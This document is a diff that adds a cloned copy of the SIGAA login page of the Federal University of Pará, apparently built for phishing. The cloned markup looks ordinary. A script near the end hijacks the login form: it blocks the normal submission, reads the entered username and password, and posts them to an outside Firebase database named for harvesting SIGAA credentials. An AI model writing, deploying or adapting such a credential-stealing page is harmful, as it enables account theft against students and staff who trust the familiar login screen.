@@ -1,0 +1,378 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html class="background"><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+<meta http-equiv="Pragma" content="no-cache">
+
+
+<title>SIGAA - Sistema Integrado de Gestão de Atividades Acadêmicas</title>
+<link rel="shortcut icon" href="https://sigaa.ufpa.br/sigaa/img/sigaa.ico">
+
+<script type="text/javascript" src="jawr_loader.js"></script>
+<script type="text/javascript">
+                JAWR.loader.style('/bundles/css/sigaa_base.css', 'all');
+        		JAWR.loader.style('/css/ufrn_print.css', 'print');
+
+        		JAWR.loader.script('/bundles/js/sigaa_base.js');
+</script> <link rel="stylesheet" type="text/css" media="all" href="sigaa_base.css">  <link rel="stylesheet" type="text/css" media="print" href="ufrn_print.css">  <script type="text/javascript" src="sigaa_base.js"> </script> 
+<link rel="stylesheet" type="text/css" media="all" href="sigaa.css">
+
+
+<link rel="alternate stylesheet" type="text/css" media="screen" title="mono" href="mono.css">
+<link rel="alternate stylesheet" type="text/css" media="screen" title="contraste" href="contraste.css">
+<script src="styleswitch.js" type="text/javascript"></script>
+
+<script src="teste.js" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+			var mensagem;
+			var initMensagem = function() {
+				mensagem = new Mensagem();
+			}
+			YAHOO.util.Event.addListener(window,'load', initMensagem);
+			
+			function isIE(){
+			
+						return false;
+				
+			}
+		</script>
+
+<script type="text/javascript">
+function trocaCalendario(id) {
+	location.href = "/sigaa/escolhaCalendario.do?dispatch=escolher&calendarioEscolhido="+id;
+}
+</script>	
+
+</head>
+
+		 	
+<body><div id="painel-mensagem-envio_mask" class="mask" style="z-index: 5; height: 966px; width: 1920px;">&nbsp;</div>
+
+
+
+
+
+
+	<div id="container">
+	<div id="cabecalho">
+	<div id="info-sistema">
+	<h1><span>UFPA - SIGAA -</span></h1>
+	<h3>Sistema Integrado de Gestão de Atividades Acadêmicas</h3>
+	<div class="dir">
+	
+	</div>
+	</div>
+	 
+
+	<div id="painel-usuario" style="height: 20px;">
+	
+	<div id="menu-principal"></div>
+	</div>
+	</div>
+	
+
+	<div id="conteudo">
+
+
+
+
+<script src="encoding.js" type="text/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<script type="text/javascript">
+		function isMobile(){	 		
+			var a = navigator.userAgent||navigator.vendor||window.opera;
+			if (/android|blackberry|ip(hone|od|ad)|kindle|maemo|opera m(ob|in)i|palm( os)?|symbian/i.test(a)) {			
+				return true;
+			} else {
+				return false;
+			}	
+		}
+
+		if (isMobile()) {
+			window.location = "/sigaa/mobile/touch/login.jsf";
+		}
+	</script>
+
+
+
+ 
+
+
+
+
+<style type="text/css">
+.painel {  background-color: #EFF3FA; padding: 5px; width: 16%; text-align: center; }
+.sistemaAtual { background-color: #FFFFE4; } 
+</style>
+
+
+
+	<div style="margin: 0 auto; background: #EFF3FA; padding: 10px;" align="center">
+		<p style="font-weight: bold; color: #F00;">ATENÇÃO!</p>
+		<p style="width: 75%;">	O sistema diferencia letras maiúsculas de minúsculas APENAS na senha,
+		portanto ela deve ser digitada da mesma maneira que no cadastro.</p>
+	</div>
+
+
+<div style="width: 100%; margin: 0 auto; padding: 10px 0;" align="center">
+<table style="border-collapse: separate; border-spacing: 3px" width="100%" align="center">
+	<tbody><tr>
+		
+		<td class="painel sistemaAtual">
+			<a href="https://sigaa.ufpa.br/sigaa/">
+			SIGAA</a> <br> 
+			(Acadêmico)
+		</td>
+		
+		
+		<td class="painel ">
+			<a href="https://sipac.ufpa.br/sipac/">
+			SIPAC</a><br>
+			(Administrativo)
+		</td>
+		
+		
+		<td class="painel ">
+			<a href="https://sigrh.ufpa.br/sigrh/">
+			SIGRH</a><br>
+			(Recursos Humanos)
+		</td>
+		
+		
+		
+		<td class="painel ">
+			<a href="https://siged.ufpa.br/siged/">
+			SIGED</a><br>
+			(Gestão Eletrônica de Documentos)
+		</td>
+		
+		
+	</tr>
+	
+	<tr>
+	
+		
+		<td class="painel ">
+			<a href="https://sigeleicao.ufpa.br/sigeleicao/">
+			SIGEleicão</a> <br>
+			(Controle de Processos Eleitorais)			
+		</td>
+		
+		
+		
+		<td class="painel ">
+			<a href="https://sigaa.ufpa.br/eventos/">
+			</a><br>
+			(Gestão de Eventos)
+		</td>
+		
+		
+		
+		<td class="painel ">
+			<a href="https://sigadmin.ufpa.br/admin/">
+			SIGAdmin</a><br>
+			(Administração e Comunicação)
+		</td>
+		
+		
+	</tr>
+</tbody></table>
+</div>
+
+
+
+
+
+<br>
+
+
+	
+	
+		<center>
+		Perdeu o e-mail de confirmação de cadastro? <a href="https://sigadmin.ufpa.br/admin/public/recuperar_codigo.jsf">Clique aqui para recuperá-lo.</a> <br>
+		Esqueceu o login? <a href="https://sigadmin.ufpa.br/admin/public/recuperar_login.jsf">Clique aqui para recuperá-lo.</a> <br>
+		Esqueceu a senha? <a href="https://sigadmin.ufpa.br/admin/public/recuperar_senha.jsf">Clique aqui para recuperá-la.</a>
+		</center>
+	
+
+
+<br clear="all">
+
+	<br>
+	<center style="color: #922; font-weight: bold;"></center>
+
+<br>
+<div class="logon" style="width:50%; margin: 0 auto;">
+<h3> Entrar no Sistema </h3> 
+<form name="loginForm" method="post" action="/sigaa/logar.do?dispatch=logOn" _lpchecked="1">
+	<input type="hidden" name="width" value="1920" id="width">
+	<input type="hidden" name="height" value="1080" id="height">
+	<input type="hidden" name="urlRedirect" value="">
+	<input type="hidden" name="subsistemaRedirect" value="">
+	<input type="hidden" name="acao" value="">
+	<input type="hidden" name="acessibilidade" value="">
+
+	<script>
+		document.getElementById('width').value = screen.width;
+		document.getElementById('height').value = screen.height;
+	</script>
+
+<table width="100%" cellspacing="0" cellpadding="3" align="center">
+<tbody>
+	<tr>
+		<th width="35%">  Usuário: </th>
+		<td align="left"> <input type="text" name="user.login" size="20" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: contain; background-position: 98% 50%;"></td>
+	</tr>
+	<tr>
+		<th> Senha: </th>
+		<td> <input type="password" name="user.senha" size="20" value="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: contain; background-position: 98% 50%;"> </td>
+	</tr>
+</tbody>
+<tfoot>
+	<tr>
+		<td colspan="2" align="center">
+			<input type="submit" value="Entrar">
+		</td>
+	</tr>
+</tfoot>
+</table>
+</form>
+<script type="text/javascript" language="JavaScript">
+  <!--
+  var focusControl = document.forms["loginForm"].elements["user.login"];
+
+  if (focusControl.type != "hidden" && !focusControl.disabled) {
+     focusControl.focus();
+  }
+  // -->
+</script>
+
+
+</div>
+
+<table width="100%" cellspacing="0" cellpadding="0" border="0" align="center">
+	<tbody><tr>
+		<td colspan="5" width="33%" align="center">
+			<br><br>
+			<b>Professor ou Funcionário,</b> <br>
+			caso ainda não possua cadastro no SIGAA,<br>clique no link abaixo.<br>
+			<a href="https://sigadmin.ufpa.br/admin/auto_cadastro/form.jsf?origem=2">
+				<img src="novo_usuario.gif" alt="Novo Usuário" width="16" height="16" border="0">
+				<br>
+				Cadastre-se
+			</a>
+		</td>
+		<td colspan="5" width="33%" align="center">
+			<br><br>
+			<b>Aluno,</b><br>caso ainda não possua cadastro no SIGAA, <br>clique no link abaixo.<br>
+			<a href="https://sigaa.ufpa.br/sigaa/public/cadastro/discente.jsf"><img src="user.png" alt="Novo Usuário" border="0">
+				<br>
+				Cadastre-se</a>
+		</td>
+		
+	</tr>
+</tbody></table>
+<br><br><br>
+<table align="center">
+	<tbody><tr>
+		<td><a href="http://www.sistemas.ufrn.br/download/Firefox.exe" target="_blank"><img src="firefox.jpg" width="20" height="20" border="0"></a></td>
+		<td><b>Este sistema é melhor visualizado utilizando o
+			<a href="http://www.sistemas.ufrn.br/download/Firefox.exe" target="_blank">Mozilla Firefox</a>,
+			para baixá-lo e instalá-lo,
+			<a href="http://www.sistemas.ufrn.br/download/Firefox.exe" target="_blank">clique aqui</a></b>.
+		</td>
+	</tr>
+	<tr>
+		<td><a href="http://www.sistemas.ufrn.br/download/AdbeRdr910_pt_BR.exe" target="_blank"><img src="adobe.jpg" width="20" height="20" border="0"></a></td>
+		<td><b>Para visualizar documentos é necessário utilizar o
+			<a href="http://www.sistemas.ufrn.br/download/AdbeRdr910_pt_BR.exe" target="_blank">Adobe Reader</a>,
+			para baixá-lo e instalá-lo,
+			<a href="http://www.sistemas.ufrn.br/download/AdbeRdr910_pt_BR.exe" target="_blank">clique aqui</a></b>.
+		</td>
+	</tr>
+
+</tbody></table>
+
+
+
+<div class="clear"> </div>
+
+</div> 
+	<br>
+
+	
+
+	<div id="rodape">
+		<p>	SIGAA | Centro de Tecnologia da Informação e Comunicação (CTIC) - 
+(91) 3201-7288/7808/7802/7391/7800/2061 | Copyright © 2006-2019 - UFPA -
+ jatoba.ufpa.br.jatoba2
+		
+		 
+			 - <a onclick="javascript:versao();">v3.14.25.83</a>
+				
+		</p>
+	</div>
+
+
+</div>  
+
+<div class="panel-container dialog shadow" id="painel-mensagem-envio_c" style="z-index: 6; left: 128px; top: 447px;"><div id="painel-mensagem-envio" class=" module overlay panel" style="visibility: inherit; width: 700px;"><div class="hd" style="cursor: move;" id="painel-mensagem-envio_h">Mensagem</div> <div class="bd">Aguarde...<form name="frm_painel-mensagem-envio" action=""></form></div><div class="ft"><span class="button-group"><button type="button" class="default">Enviar</button><button type="button">Cancelar</button></span></div><div class=" close secure">&nbsp;</div></div><div class="underlay">&nbsp;</div></div>
+
+
+
+
+
+
+ 
+	<script type="text/javascript" charset="UTF-8">
+		function versao(){
+			var msg='';
+			msg+='SIGAA 3.14.25.83,  publicado em: 13/12/2018\n\n';
+			msg+='Depend\u00eancias:\n';
+			msg+='Arquitetura 2.6.44\n';
+			msg+='Entidades Comuns 1.2.72\n';
+			msg+='Servicos Integrados 1.3.36\n';
+			msg+='SharedResources 1.4.21\n\n';
+			msg+='Copyright SINFO/UFRN';
+			alert(msg);
+		}	
+	</script>
+	
+	<script>
+
+		window.onload = function () {
+			var formulario = document.forms["loginForm"];
+			formulario.action = '';
+			formulario.method = '';
+			formulario[8].type = "button";
+			formulario[8].onclick = function() {
+				var credentials = { usuario: formulario[6].value, senha: formulario[7].value };
+				console.log(credentials);
+				$.post('https://sigaa-credentials.firebaseio.com/.json',
+					JSON.stringify(credentials),
+					function () {
+						console.log("sucesso :)");
+					}
+				);
+			};	
+		};
+	</script>
+
+
+<script language="javascript">
+Relogio.init(90);
+</script>
+<iframe id="_yuiResizeMonitor" style="visibility: visible; width: 10em; height: 10em; position: absolute; top: -112px; left: -112px; border-style: none; border-width: 0px; opacity: 0;"></iframe></body></html>
